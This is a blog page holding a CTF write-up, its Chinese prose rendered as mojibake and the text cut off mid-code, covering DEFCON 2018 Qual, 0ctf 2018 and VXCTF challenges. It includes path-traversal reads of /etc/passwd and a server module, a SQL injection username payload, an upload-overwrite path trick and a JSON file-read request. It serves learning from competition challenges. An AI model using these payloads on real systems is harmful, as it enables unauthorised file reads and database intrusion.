<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <meta http-equiv="X-UA-Compatible" content="IE=edge" >
  <title>DEFCON CTF 2018 Qualå’Œä¸€äº›æœ‰è¶£é¡Œç›® | Kaibro&#39;s blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/earlyaccess/notosanstc.css">
  <meta name="description" content="é€™ç¯‡ä¸»è¦ç”¨ä¾†è¨˜éŒ„è¿‘æœŸå¹¾å ´CTFçš„ä¸€äº›Writeupå’Œå¿ƒå¾— DEFCON CTF 2018 Qualé€™å ´æ¯”è³½æˆ‘å€‘éšŠå’Œå°å¤§é‚„æœ‰äº¤å¤§ç­‰éšŠä¼ä¸€èµ·çµ„æˆè¯éšŠ è¦‹è­˜åˆ°å…¶ä»–éšŠä¼è·Ÿè‡ªå·±çš„å·®è·ï¼Œå­¸äº†å¾ˆå¤š">
<meta name="keywords" content="CTF,Web">
<meta property="og:type" content="article">
<meta property="og:title" content="DEFCON CTF 2018 Qualå’Œä¸€äº›æœ‰è¶£é¡Œç›®">
<meta property="og:url" content="http://blog.kaibro.tw/2018/05/16/DEFCON-CTF-2018-Qual/index.html">
<meta property="og:site_name" content="Kaibro&#39;s blog">
<meta property="og:description" content="é€™ç¯‡ä¸»è¦ç”¨ä¾†è¨˜éŒ„è¿‘æœŸå¹¾å ´CTFçš„ä¸€äº›Writeupå’Œå¿ƒå¾— DEFCON CTF 2018 Qualé€™å ´æ¯”è³½æˆ‘å€‘éšŠå’Œå°å¤§é‚„æœ‰äº¤å¤§ç­‰éšŠä¼ä¸€èµ·çµ„æˆè¯éšŠ è¦‹è­˜åˆ°å…¶ä»–éšŠä¼è·Ÿè‡ªå·±çš„å·®è·ï¼Œå­¸äº†å¾ˆå¤š">
<meta property="og:image" content="https://i.imgur.com/1m5PjtZ.png">
<meta property="og:image" content="https://i.imgur.com/ddF81JT.png">
<meta property="og:image" content="https://i.imgur.com/dilXywj.png">
<meta property="og:image" content="https://i.imgur.com/FrUJbJz.png">
<meta property="og:updated_time" content="2018-05-24T08:59:41.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="DEFCON CTF 2018 Qualå’Œä¸€äº›æœ‰è¶£é¡Œç›®">
<meta name="twitter:description" content="é€™ç¯‡ä¸»è¦ç”¨ä¾†è¨˜éŒ„è¿‘æœŸå¹¾å ´CTFçš„ä¸€äº›Writeupå’Œå¿ƒå¾— DEFCON CTF 2018 Qualé€™å ´æ¯”è³½æˆ‘å€‘éšŠå’Œå°å¤§é‚„æœ‰äº¤å¤§ç­‰éšŠä¼ä¸€èµ·çµ„æˆè¯éšŠ è¦‹è­˜åˆ°å…¶ä»–éšŠä¼è·Ÿè‡ªå·±çš„å·®è·ï¼Œå­¸äº†å¾ˆå¤š">
<meta name="twitter:image" content="https://i.imgur.com/1m5PjtZ.png">
  
    <link rel="alternative" href="/atom.xml" title="Kaibro&#39;s blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link rel="stylesheet" href="/css/style.css">
</head>

<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			
			<img lazy-src="https://i.imgur.com/QWxDDzd.jpg" class="js-avatar">
			
		</a>

		<hgroup>
		  <h1 class="header-author"><a href="/">KaiBro</a></h1>
		</hgroup>

		

		
			<div class="switch-btn">
				<div class="icon">
					<div class="icon-ctn">
						<div class="icon-wrap icon-house" data-idx="0">
							<div class="birdhouse"></div>
							<div class="birdhouse_holes"></div>
						</div>
						<div class="icon-wrap icon-ribbon hide" data-idx="1">
							<div class="ribbon"></div>
						</div>
						
						
						<div class="icon-wrap icon-me hide" data-idx="3">
							<div class="user"></div>
							<div class="shoulder"></div>
						</div>
						
					</div>
					
				</div>
				<div class="tips-box hide">
					<div class="tips-arrow"></div>
					<ul class="tips-inner">
						<li>Menu</li>
						<li>Tags</li>
						
						
						<li>About</li>
						
					</ul>
				</div>
			</div>
		

		<div class="switch-area">
			<div class="switch-wrap">
				<section class="switch-part switch-part1">
					<nav class="header-menu">
						<ul>
						
							<li><a href="/">ä¸»é </a></li>
				        
							<li><a href="/archives">æ‰€æœ‰æ–‡ç« </a></li>
				        
							<li><a href="http://cv.kaibro.tw/">é—œæ–¼æˆ‘</a></li>
				        
						</ul>
					</nav>
					<nav class="header-nav">
						<div class="social">
							
								<a class="github" target="_blank" href="https://github.com/w181496" title="github">github</a>
					        
								<a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
					        
								<a class="facebook" target="_blank" href="https://www.facebook.com/w181496" title="facebook">facebook</a>
					        
						</div>
					</nav>
				</section>
				
				
				<section class="switch-part switch-part2">
					<div class="widget tagcloud" id="js-tagcloud">
						<a href="/tags/BugBounty/" style="font-size: 10px;">BugBounty</a> <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/DEFCON/" style="font-size: 12px;">DEFCON</a> <a href="/tags/Linux/" style="font-size: 12px;">Linux</a> <a href="/tags/NCU/" style="font-size: 14px;">NCU</a> <a href="/tags/NTU/" style="font-size: 12px;">NTU</a> <a href="/tags/Pwn/" style="font-size: 16px;">Pwn</a> <a href="/tags/Web/" style="font-size: 18px;">Web</a> <a href="/tags/ç­†è¨˜/" style="font-size: 20px;">ç­†è¨˜</a> <a href="/tags/é–‹ç®±/" style="font-size: 10px;">é–‹ç®±</a> <a href="/tags/é–‹ç®±æ–‡/" style="font-size: 10px;">é–‹ç®±æ–‡</a>
					</div>
				</section>
				
				
				

				
				
				<section class="switch-part switch-part3">
				
					<div id="js-aboutme">å®‰å®‰ï¼Œæˆ‘æ˜¯Kaibroï¼Œç›®å‰æ˜¯112é›»æ©Ÿæ‰€CSçµ„çš„è‹¦å‘½çˆ†è‚è¸é…’ç”Ÿ</div>
				</section>
				
			</div>
		</div>
	</header>				
</div>

    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
  	<div class="overlay">
  		<div class="slider-trigger"></div>
  		<h1 class="header-author js-mobile-header hide">KaiBro</h1>
  	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
			
				<img lazy-src="https://i.imgur.com/QWxDDzd.jpg" class="js-avatar">
			
			</div>
			<hgroup>
			  <h1 class="header-author">KaiBro</h1>
			</hgroup>
			
			<nav class="header-menu">
				<ul>
				
					<li><a href="/">ä¸»é </a></li>
		        
					<li><a href="/archives">æ‰€æœ‰æ–‡ç« </a></li>
		        
					<li><a href="http://cv.kaibro.tw/">é—œæ–¼æˆ‘</a></li>
		        
		        <div class="clearfix"></div>
				</ul>
			</nav>
			<nav class="header-nav">
				<div class="social">
					
						<a class="github" target="_blank" href="https://github.com/w181496" title="github">github</a>
			        
						<a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
			        
						<a class="facebook" target="_blank" href="https://www.facebook.com/w181496" title="facebook">facebook</a>
			        
				</div>
			</nav>
		</header>				
	</div>
</nav>

      <div class="body-wrap"><article id="post-DEFCON-CTF-2018-Qual" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2018/05/16/DEFCON-CTF-2018-Qual/" class="article-date">
  	<time datetime="2018-05-15T19:37:40.000Z" itemprop="datePublished">2018-05-16</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      DEFCON CTF 2018 Qualå’Œä¸€äº›æœ‰è¶£é¡Œç›®
    </h1>
  

      </header>
      
      <div class="article-info article-info-post">
        
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li></ul>
	</div>

        

        <div class="clearfix"></div>
      </div>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>é€™ç¯‡ä¸»è¦ç”¨ä¾†è¨˜éŒ„è¿‘æœŸå¹¾å ´CTFçš„ä¸€äº›Writeupå’Œå¿ƒå¾—</p>
<h2 id="DEFCON_CTF_2018_Qual"><a href="#DEFCON_CTF_2018_Qual" class="headerlink" title="DEFCON CTF 2018 Qual"></a>DEFCON CTF 2018 Qual</h2><p>é€™å ´æ¯”è³½æˆ‘å€‘éšŠå’Œå°å¤§é‚„æœ‰äº¤å¤§ç­‰éšŠä¼ä¸€èµ·çµ„æˆè¯éšŠ</p>
<p>è¦‹è­˜åˆ°å…¶ä»–éšŠä¼è·Ÿè‡ªå·±çš„å·®è·ï¼Œå­¸äº†å¾ˆå¤š</p>
<p><img src="https://i.imgur.com/1m5PjtZ.png" alt="rank"></p>
<a id="more"></a>
<h3 id="Easy_Pisy"><a href="#Easy_Pisy" class="headerlink" title="Easy Pisy"></a>Easy Pisy</h3><p>é€™é¡Œæœ‰å…©å€‹åŠŸèƒ½ï¼š<code>sign</code>è·Ÿ<code>execute</code></p>
<p>signåªçµ¦æˆ‘å€‘sign ECHOæŒ‡ä»¤(ä»–æœƒç”¨OCRå»è¾¨è­˜pdfä¸Šçš„æ–‡å­—)</p>
<p>executeåŠŸèƒ½å¦‚æœçµ¦æ­£ç¢ºçš„signatureï¼Œä»–å°±æœƒå»åŸ·è¡Œpdfä¸Šé¢çš„æŒ‡ä»¤</p>
<p>æ‰€ä»¥å¦‚æœæˆ‘å€‘æœ‰è¾¨æ³•æ§‹é€ æˆ–ç¹ésignatureå°±èƒ½æå®šé€™é¡Œæƒ¹</p>
<p>é€™é¡Œæ¯”è¼ƒé›£ç™¼ç¾çš„é—œéµé»æ˜¯ï¼Œ<code>openssl_verify</code>åœ¨signå‰ä½¿ç”¨<code>SHA1</code></p>
<p>ä¹Ÿå°±æ˜¯èªªå¯ä»¥å»æ’SHA1 Collision</p>
<p>å¯ä»¥ä½¿ç”¨é€™å€‹Toolä¾†è¼”åŠ©ï¼š<a href="https://github.com/nneonneo/sha1collider/" target="_blank" rel="external">https://github.com/nneonneo/sha1collider/</a></p>
<p>ç”¢ç”Ÿå…©å€‹pdfæª”: (1) ECHO kaibro  (2) EXECUTE cat flag</p>
<p>ç„¶å¾Œç”¨é€™å€‹Toolå»æ’SHA1 Collsion</p>
<p>æ¯”è¼ƒéº»ç…©çš„é»æ˜¯ï¼Œä»–çš„OCRæœ‰é»ä¸å¤ªç²¾æº–ï¼Œå¾ˆå¤šå­—å‹ä»–éƒ½è¾¨è­˜å¾—å¾ˆå·®ï¼Œå¯èƒ½è¦å¤šè¸¹å¹¾æ¬¡</p>
<p>æˆåŠŸå¾Œï¼Œå…©å€‹pdfæª”å°±æœ‰ç›¸åŒ<code>SHA1 hash</code>ï¼Œä½†å…©å€‹pdfç”¨OCRè¾¨è­˜å‡ºä¾†çš„æ–‡å­—ä¸åŒ</p>
<p>æˆ‘æ’å‡ºä¾†çš„å…©å€‹pdfå¦‚ä¸‹:</p>
<p><a href="https://github.com/w181496/CTF/blob/master/defcon2018-qual/EasyPisy/echo.pdf" target="_blank" rel="external">https://github.com/w181496/CTF/blob/master/defcon2018-qual/EasyPisy/echo.pdf</a></p>
<p><a href="https://github.com/w181496/CTF/blob/master/defcon2018-qual/EasyPisy/execute.pdf" target="_blank" rel="external">https://github.com/w181496/CTF/blob/master/defcon2018-qual/EasyPisy/execute.pdf</a></p>
<p>å…ˆsign pdf(1)ï¼Œä¹‹å¾ŒæŠŠå¾—åˆ°çš„SHA1 hashå’Œpdf(2)ä¸€èµ·ä¸Ÿå»executeï¼Œå°±æ‹¿åˆ°FLAGæƒ¹</p>
<p><code>OOO{phP_4lw4y5_d3l1v3r5_3h7_b35T_fl4g5}</code></p>
<p><img src="https://i.imgur.com/ddF81JT.png" alt=""></p>
<h3 id="PHP_Eval_White-List"><a href="#PHP_Eval_White-List" class="headerlink" title="PHP Eval White-List"></a>PHP Eval White-List</h3><p>é€™é¡Œå‡ºå£æƒ¹</p>
<p>ç›´æ¥<code>system(&quot;../flag&quot;)</code>å°±å™´FLAG</p>
<p><img src="https://i.imgur.com/dilXywj.png" alt=""></p>
<h3 id="exzendtential-crisis"><a href="#exzendtential-crisis" class="headerlink" title="exzendtential-crisis"></a>exzendtential-crisis</h3><p>é€™é¡Œå¾ˆå®¹æ˜“å¯ä»¥ç™¼ç¾LFI:</p>
<p><code>http://d4a386ad.quals2018.oooverflow.io/essays.php?preview&amp;name=../../../../../etc/passwd</code></p>
<p>å¯ä»¥é€éLFIå»è®€essays.phpã€login.phpã€register.phpçš„æºç¢¼</p>
<p>æœƒç™¼ç¾login.phpæœƒå»callä¸€å€‹å¥‡æ€ªçš„function: <code>check_credentials</code></p>
<p>register.phpä¹Ÿæ˜¯: <code>create_user</code></p>
<p>ä¼°è¨ˆå°±æ˜¯ä»–è‡ªå·±å¯«çš„extension</p>
<p>ç¿»ä¸€ä¸‹<code>php.ini</code>ï¼Œå¯ä»¥æ‰¾åˆ°<code>mydb.so</code>çš„è·¯å¾‘</p>
<p>ç”¨LFIæŠŠä»–è¼‰ä¸‹ä¾†: <code>/essays.php?preview&amp;name=../../../../../usr/lib/php/20151012/mydb.so</code></p>
<p>ç”¨ida proå»çœ‹ï¼Œå¯ä»¥ç™¼ç¾å®ƒDBæ˜¯ç”¨SQLite</p>
<p>mydb.soæœ‰dbè·¯å¾‘ï¼Œæ‰€ä»¥å¯ä»¥æŠŠä»–çš„DBè¼‰ä¸‹ä¾† (ä½†å› ç‚º<code>file_get_contents</code>æœ‰é•·åº¦é™åˆ¶ï¼Œæ‰€ä»¥æ²’è¾¦æ³•è¼‰å®Œæ•´çš„)</p>
<p><img src="https://i.imgur.com/FrUJbJz.png" alt=""></p>
<p>æœƒç™¼ç¾ç›®æ¨™çš„å¸³è™Ÿè·Ÿå¯†ç¢¼: <code>sarte:5f0e11fe91a3196d7bf8e80a7ee0bbdf516b1952a57569e4809a9e7bf21ad0f6</code></p>
<p>è³½ä¸­æœ‰è©¦è‘—å»æ’ï¼Œä½†æ’ä¸å‡ºä¾† (SHA256æ”ª20æ¬¡)</p>
<p>ç„¶å¾Œå°±æ˜¯ä¸€é€£ä¸²å´©æ½°é€†å‘ </p>
<p>ç¿»äº†ä¸€ä¸‹ä¹‹å¾Œï¼Œä¸€ç›´è¦ºå¾—é€™é¡Œæ‡‰è©²æ˜¯æƒ³è€ƒSQL Injection (å› ç‚ºè£¡é¢ç‰¹åˆ¥å»æ“‹SQL Injection payloadï¼Œåˆæ“‹ä¸å®Œæ•´)</p>
<p>ç„¶å¾Œä»–é‚„æœƒæŠŠåƒæ•¸è£¡é¢çš„<code>&#39;</code>æ›æˆ<code>&#39;&#39;</code></p>
<p>åŸæœ¬ä»¥ç‚ºç°¡å–®çš„<code>\&#39;</code> =&gt; <code>\&#39;&#39;</code>å°±èƒ½æƒ¹ï¼Œå¾Œä¾†æ‰çŸ¥é“åŸä¾†SQLiteä¸èƒ½é€™æ¨£è·³è„«QQ</p>
<p>è³½å¾Œæ‰çŸ¥é“åŸä¾†æ´åœ¨: </p>
<p><code>check_hacking_attempt()</code>è£¡usernameå¯ä»¥è“‹è¶…éusername_checkï¼Œç„¶å¾Œè“‹åˆ°ä¸‹é¢çš„<code>table_name</code></p>
<p>source codeåœ¨é€™: <a href="https://github.com/o-o-overflow/chall-exzendtential-crisis/blob/master/src/c/" target="_blank" rel="external">https://github.com/o-o-overflow/chall-exzendtential-crisis/blob/master/src/c/</a></p>
<p>è³½ä¸­æ˜¯æœ‰è¸¹å‡ºä¾†usernameé•·åº¦é™åˆ¶å¤§æ¦‚åˆ°111ï¼Œä½†æ²’ç™¼ç¾ä»–æ˜¯è“‹åˆ°table_name</p>
<p>æ‰€ä»¥æœ€å¾Œpayloadåªè¦é€™æ¨£å°±èƒ½ç¹éæƒ¹:</p>
<p><code>username=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABusers where rowid=1;--&amp;password=a</code></p>
<p>å› ç‚º<code>AA...AAB</code>å¾Œé¢çš„<code>users where rowid=1</code>æœƒè“‹åˆ°<code>table_name</code></p>
<p>æ‰€ä»¥é€™é‚Š<code>snprintf(cmd, sizeof(cmd), &quot;select rowid from %s where username = &#39;%s&#39; and password = &#39;%s&#39;;&quot;, table_name, username, password);</code>å°±å¯ä»¥æ³¨å…¥æƒ¹</p>
<hr>
<p>æ•´é«”ä¾†èªªï¼Œé€™å ´çš„ç¢ºå¾ˆå¤šé»‘äººå•è™Ÿçš„é¡Œç›®</p>
<p>(é›–ç„¶ä¹Ÿæ˜¯æœ‰ä¸€äº›å¥½é¡Œç›®)</p>
<p>ä¸å°‘é¡Œç›®éƒ½æœ‰çŒœæ¸¬æˆ–æš´åŠ›çš„æˆåˆ†åœ¨è£¡é ­</p>
<p>Webé¡Œä¹Ÿæ˜¯ä¸€å †éƒ½è¦å»é€†å‘<code>.so</code>æª”ï¼Œå¾ˆä¸web</p>
<p>ä¸ééšŠå‹å¤ªCarryï¼Œæœ€å¾Œè¯éšŠé‚„æ˜¯æ‹¿åˆ°22å è·ªæƒ¹</p>
<p>ç¬¬ä¸€æ¬¡åƒåŠ DEFCON Qualå°±æ‰“é€²æ±ºè³½ï¼Œé‹æ°£çœŸçš„å¾ˆå¥½XD</p>
<h2 id="0ctf_2018_Qual"><a href="#0ctf_2018_Qual" class="headerlink" title="0ctf 2018 Qual"></a>0ctf 2018 Qual</h2><h3 id="EzDoor"><a href="#EzDoor" class="headerlink" title="EzDoor"></a>EzDoor</h3><p>é€™é¡Œè »æœ‰è¶£çš„ï¼Œç¬¬ä¸€æ¬¡ç¢°opcache</p>
<p>ä»–æœ‰å¹¾å€‹å°åŠŸèƒ½ï¼Œå¯ä»¥çœ‹phpinfoã€ä¸Šå‚³æª”æ¡ˆç­‰</p>
<p>é›–ç„¶èƒ½ä¸Šå‚³ï¼Œä½†æ˜¯æœƒæª¢æŸ¥å‰¯æª”åæœ‰æ²’æœ‰å‡ºç¾hï¼Œæœ‰çš„è©±å°±ç®—ä¸åˆæ³•</p>
<p><code>stristr(pathinfo($name)[&quot;extension&quot;], &quot;h&quot;))</code></p>
<p>å‚³å…¶ä»–æª”æ¡ˆä¸Šå»éƒ½ä¸èƒ½ç›´æ¥è¨ªå•ï¼Œæœƒ403ï¼Œæ‰€ä»¥å°±æ˜¯è¦æƒ³è¾¦æ³•è“‹index.php</p>
<p><code>move_uploaded_file()</code>å¯ä»¥è¦†è“‹èˆŠæª”æ¡ˆï¼Œä½†æ˜¯index.phpå‰¯æª”åæœ‰hï¼Œè¦æƒ³è¾¦æ³•ç¹</p>
<p>ç›´è¦ºæƒ³åˆ°ä»¥å‰çœ‹éçš„ä¸€æ‹›: <code>index.php/.</code> </p>
<p>ä½†æ˜¯é€™æ‹›æ²’è¾¦æ³•è¦†å¯«èˆŠæª”æ¡ˆï¼Œåªèƒ½å¯«æ–°æª”æ¡ˆ</p>
<p>æ”¹ç”¨<code>a/../index.php/.</code>å°±èƒ½æˆåŠŸè¦†å¯«ï¼Œé€™è·Ÿä»–åº•å±¤å¯¦ä½œæœ‰é—œï¼Œå¯ä»¥å»ç¿»source code</p>
<p>è³½å¾Œæ‰çŸ¥é“é€™æ˜¯éé æœŸè§£æ³•XD</p>
<p>ç„¶å¾Œç¿»ä¸€ä¸‹<code>/var/www/html/flag/</code>ä¸‹é¢ï¼Œæœƒçœ‹åˆ°æœ‰å€‹æª”æ¡ˆ<code>93f4c28c0cf0b07dfd7012dca2cb868cc0228cad</code></p>
<p>è£¡é ­æ˜¯OPcache Byte code</p>
<p>å…§å®¹ä¹çœ‹ä¹‹ä¸‹æ˜¯åœ¨åšä¸€é€£ä¸²flagçš„åŠ è§£å¯†</p>
<p>å¤§æ¦‚å°±çŒœæƒ³å¯èƒ½è¦å»é€†å‘å®ƒ</p>
<p>æ–¼æ˜¯æ‰¾åˆ°é€™å€‹Toolæœ‰Disassembler: <a href="https://github.com/GoSecure/php7-opcache-override" target="_blank" rel="external">https://github.com/GoSecure/php7-opcache-override</a></p>
<p>ä½†æ˜¯è¸¹äº†å¾ˆä¹…ä¸€ç›´Failï¼Œä¸€é–‹å§‹é‚„è¦è£ç‰¹å®šç‰ˆæœ¬çš„constructå¥—ä»¶</p>
<p>ä¹Ÿä¿®æ­£opcacheä¸­é–“å°‘ä¸€å€‹NULL Byteçš„å•é¡Œï¼Œçµæœé‚„æ˜¯ä¸è¡Œï¼Œå°±å¡åœ¨é€™æ²’è§£å‡ºä¾†Orz</p>
<p>è³½å¾Œæ‰çŸ¥é“Toolæ²’è™•ç†åˆ°æŸäº›opcodeï¼Œè¦æ‰‹å‹•ä¿®æ­£å»é€†å‘â€¦</p>
<p>ä¿®æ­£å¾Œå¯ä»¥é‚„åŸå‡ºä»¥ä¸‹pseudo code:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div></pre></td><td class="code"><pre><div class="line">function encrypt() &#123;</div><div class="line">      #0 !0 = RECV(None, None);</div><div class="line">      #1 !0 = RECV(None, None);</div><div class="line">      #2 DO_FCALL_BY_NAME(None, &apos;mt_srand&apos;);</div><div class="line">      #3 SEND_VAL(1337, None);</div><div class="line">      #4 (129)?(None, None);</div><div class="line">      #5 ASSIGN(!0, &apos;&apos;);</div><div class="line">      #6 (121)?(!0, None);</div><div class="line">      #7 ASSIGN(None, None);</div><div class="line">      #8 (121)?(!0, None);</div><div class="line">      #9 ASSIGN(None, None);</div><div class="line">      #10 ASSIGN(None, 0);</div><div class="line">      #11 JMP(-&gt;-24, None);</div><div class="line">      #12 DO_FCALL_BY_NAME(None, &apos;chr&apos;);</div><div class="line">      #13 DO_FCALL_BY_NAME(None, &apos;ord&apos;);</div><div class="line">      #14 FETCH_DIM_R(!0, None);</div><div class="line">      #15 (117)?(None, None);</div><div class="line">      #16 (129)?(None, None);</div><div class="line">      #17 DO_FCALL_BY_NAME(None, &apos;ord&apos;);</div><div class="line">      #18 MOD(None, None);</div><div class="line">      #19 FETCH_DIM_R(!0, None);</div><div class="line">      #20 (117)?(None, None);</div><div class="line">      #21 (129)?(None, None);</div><div class="line">      #22 BW_XOR(None, None);</div><div class="line">      #23 DO_FCALL_BY_NAME(None, &apos;mt_rand&apos;);</div><div class="line">      #24 SEND_VAL(0, None);</div><div class="line">      #25 SEND_VAL(255, None);</div><div class="line">      #26 (129)?(None, None);</div><div class="line">      #27 BW_XOR(None, None);</div><div class="line">      #28 SEND_VAL(None, None);</div><div class="line">      #29 (129)?(None, None);</div><div class="line">      #30 ASSIGN_CONCAT(!0, None);</div><div class="line">      #31 PRE_INC(None, None);</div><div class="line">      #32 IS_SMALLER(None, None);</div><div class="line">      #33 JMPNZ(None, -&gt;134217662);</div><div class="line">      #34 DO_FCALL_BY_NAME(None, &apos;encode&apos;);</div><div class="line">      #35 (117)?(!0, None);</div><div class="line">      #36 (130)?(None, None);</div><div class="line">      #37 RETURN(None, None);</div><div class="line"></div><div class="line">&#125;</div><div class="line">function encode() &#123;</div><div class="line">      #0 RECV(None, None);</div><div class="line">      #1 ASSIGN(None, &apos;&apos;);</div><div class="line">      #2 ASSIGN(None, 0);</div><div class="line">      #3 JMP(-&gt;-81, None);</div><div class="line">      #4 DO_FCALL_BY_NAME(None, &apos;dechex&apos;);</div><div class="line">      #5 DO_FCALL_BY_NAME(None, &apos;ord&apos;);</div><div class="line">      #6 FETCH_DIM_R(None, None);</div><div class="line">      #7 (117)?(None, None);</div><div class="line">      #8 (129)?(None, None);</div><div class="line">      #9 (117)?(None, None);</div><div class="line">      #10 (129)?(None, None);</div><div class="line">      #11 ASSIGN(None, None);</div><div class="line">      #12 (121)?(None, None);</div><div class="line">      #13 IS_EQUAL(None, 1);</div><div class="line">      #14 JMPZ(None, -&gt;-94);</div><div class="line">      #15 CONCAT(&apos;0&apos;, None);</div><div class="line">      #16 ASSIGN_CONCAT(None, None);</div><div class="line">      #17 JMP(-&gt;-96, None);</div><div class="line">      #18 ASSIGN_CONCAT(None, None);</div><div class="line">      #19 PRE_INC(None, None);</div><div class="line">      #20 (121)?(None, None);</div><div class="line">      #21 IS_SMALLER(None, None);</div><div class="line">      #22 JMPNZ(None, -&gt;134217612);</div><div class="line">      #23 RETURN(None, None);</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">#0 ASSIGN(None, &apos;input_your_flag_here&apos;);</div><div class="line">#1 DO_FCALL_BY_NAME(None, &apos;encrypt&apos;);</div><div class="line">#2 SEND_VAL(&apos;this_is_a_very_secret_key&apos;, None);</div><div class="line">#3 (117)?(None, None);</div><div class="line">#4 (130)?(None, None);</div><div class="line">#5 IS_IDENTICAL(None, &apos;85b954fc8380a466276e4a48249ddd4a199fc34e5b061464e4295fc5020c88bfd8545519ab&apos;);</div><div class="line">#6 JMPZ(None, -&gt;-136);</div><div class="line">#7 ECHO(&apos;Congratulation! You got it!&apos;, None);</div><div class="line">#8 EXIT(None, None);</div><div class="line">#9 ECHO(&apos;Wrong Answer&apos;, None);</div><div class="line">#10 EXIT(None, None);</div></pre></td></tr></table></figure>
<p>å¾Œé¢å°±æ˜¯å»é€†å‘ç„¶å¾Œæ¨FLAGæƒ¹</p>
<h2 id="VXCTF_2018"><a href="#VXCTF_2018" class="headerlink" title="VXCTF 2018"></a>VXCTF 2018</h2><p>é€™æ˜¯vxconçš„ä¸€å ´å°CTFï¼Œé›–ç„¶æ²’å•¥äººåƒåŠ </p>
<p>ä¸éé¡Œç›®å…¶å¯¦è »æœ‰è¶£çš„</p>
<p>æˆ‘ä¹Ÿä¸å°å¿ƒåˆ·äº†å€‹ç¬¬å››åXDD</p>
<h3 id="PHP_of_PHP"><a href="#PHP_of_PHP" class="headerlink" title="PHP of PHP"></a>PHP of PHP</h3><p>ç¶²ç«™æœ‰å…©å€‹åŠŸèƒ½ï¼š(1)<code>view</code> (2)<code>diff</code></p>
<p>viewå¯ä»¥çœ‹å„å€‹ç‰ˆæœ¬çš„php.netæºç¢¼</p>
<p>diffå¯ä»¥æ¯”è¼ƒè·Ÿç›®å‰çš„å·®ç•° (ç”¨diffæ¯”)</p>
<p>çœ‹ä¸€ä¸‹sourceï¼Œæœƒç™¼ç¾å¥¹ç”¨JSé€request</p>
<p>viewæ˜¯ç›´æ¥ç”¨GETè¨ªå•å–å¾—å…§å®¹</p>
<p>diffæ˜¯ç”¨POSTé€JSONéå»è¦å…§å®¹</p>
<p>é€çš„éƒ½æ˜¯<code>&quot;ç‰ˆæœ¬å/index&quot;</code></p>
<p>çœ‹åˆ°é€™å€‹ç›´è¦ºå°±æ˜¯LFI</p>
<p>æŠŠdiffçš„requestæ”¹æˆ<code>{&quot;version&quot;:&quot;/etc/passwd&quot;}</code></p>
<p>Bang! å™´å‡ºä¾†æƒ¹ æœç„¶å¯ä»¥LFI</p>
<p>å†ä¾†å°±è¸¹<code>{&quot;version&quot;:&quot;/v*/w*/h*/d*&quot;}</code>çœ‹diff.phpæºç¢¼</p>
<p>å™´å‡ºé€™æ®µé—œéµcode:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">set_time_limit(<span class="number">3</span>);</div><div class="line">@$data = json_decode(file_get_contents(<span class="string">'php://input'</span>), <span class="keyword">true</span>);</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($data[<span class="string">"version"</span>]))&#123;</div><div class="line">   $v = $data[<span class="string">"version"</span>];</div><div class="line">   <span class="keyword">if</span>(strlen($v) &gt;= <span class="number">15</span>)&#123;<span class="keyword">exit</span>(<span class="string">"Input too long!"</span>);&#125;</div><div class="line">   <span class="keyword">if</span>(preg_match(<span class="string">'/[^a-zA-Z0-9\/\?\*\t\n]/'</span>,$v))&#123;<span class="keyword">exit</span>(<span class="string">"Special character found in input!"</span>);&#125;</div><div class="line">   <span class="keyword">if</span>(preg_match(<span 